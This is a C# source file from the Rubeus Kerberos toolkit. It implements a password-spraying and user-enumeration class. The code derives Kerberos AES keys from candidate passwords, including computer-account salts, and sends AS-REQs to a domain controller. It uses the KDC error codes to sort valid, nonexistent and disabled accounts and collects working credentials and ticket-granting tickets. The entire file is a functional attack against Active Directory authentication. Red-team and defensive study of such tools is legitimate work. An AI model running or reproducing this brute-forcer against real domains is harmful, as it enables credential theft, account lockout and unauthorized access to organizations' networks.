using System;
using System.Collections.Generic;

namespace Rubeus
{

    public interface IBruteforcerReporter
    {
        void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE);
        void ReportValidUser(string domain, string username);
        void ReportInvalidUser(string domain, string username);
        void ReportBlockedUser(string domain, string username);
        void ReportKrbError(string domain, string username, KRB_ERROR krbError);
    }


    public class Bruteforcer
    {

        private string domain;
        private string dc;
        private IBruteforcerReporter reporter;
        private Dictionary<string, bool> invalidUsers;
        private Dictionary<string, bool> validUsers;
        private Dictionary<string, string> validCredentials;

        public Bruteforcer(string domain, string domainController, IBruteforcerReporter reporter)
        {
            this.domain = domain;
            dc = domainController;
            this.reporter = reporter;
            invalidUsers = new Dictionary<string, bool>();
            validUsers = new Dictionary<string, bool>();
            validCredentials = new Dictionary<string, string>();
        }

        public bool Attack(string[] usernames, string[] passwords)
        {
            bool success = false;
            foreach (string password in passwords)
            {
                foreach (string username in usernames)
                {
                    if(TestUsernamePassword(username, password))
                    {
                        success = true;
                    }
                }
            }

            return success;
        }

        private bool TestUsernamePassword(string username, string password)
        {
            try
            {
                if (!invalidUsers.ContainsKey(username) && !validCredentials.ContainsKey(username))
                {
                    GetUsernamePasswordTGT(username, password);
                    return true;
                }
            }
            catch (KerberosErrorException ex)
            {
                return HandleKerberosError(ex, username, password);
            }

            return false;
        }

        private void GetUsernamePasswordTGT(string username, string password)
        {
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            string salt = $"{domain.ToUpper()}{username}";

            // special case for computer account salts
            if (username.EndsWith("$"))
            {
                salt = $"{domain.ToUpper()}host{username.TrimEnd('$').ToLower()}.{domain.ToLower()}";
            }

            string hash = Crypto.KerberosPasswordHash(encType, password, salt);

            AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);

            byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, dc);

            ReportValidPassword(username, password, TGT);
        }

        private bool HandleKerberosError(KerberosErrorException ex, string username, string password)
        {
            

            KRB_ERROR krbError = ex.krbError;
            bool ret = false;

            switch ((Interop.KERBEROS_ERROR)krbError.error_code)
            {
                case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:
                    ReportValidUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                    ReportInvalidUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:
                    ReportBlockedUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP:
                    ReportInvalidEncryptionType(username, krbError);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_KEY_EXPIRED:
                    ReportValidPassword(username, password, null, (Interop.KERBEROS_ERROR)krbError.error_code);
                    ret = true;
                    break;
                default:
                    ReportKrbError(username, krbError);
                    throw ex;
            }
            return ret;
        }

        private void ReportValidPassword(string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)
        {

            validCredentials.Add(username, password);
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
            }
            reporter.ReportValidPassword(domain, username, password, ticket, err);
        }

        private void ReportValidUser(string username)
        {
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
                reporter.ReportValidUser(domain, username);
            }
        }

        private void ReportInvalidUser(string username)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                reporter.ReportInvalidUser(domain, username);
            }
        }

        private void ReportBlockedUser(string username)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                reporter.ReportBlockedUser(domain, username);
            }
        }

        private void ReportInvalidEncryptionType(string username, KRB_ERROR krbError)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                ReportKrbError(username, krbError);
            }
        }

        private void ReportKrbError(string username, KRB_ERROR krbError)
        {
            reporter.ReportKrbError(domain, username, krbError);
        }

    }
}
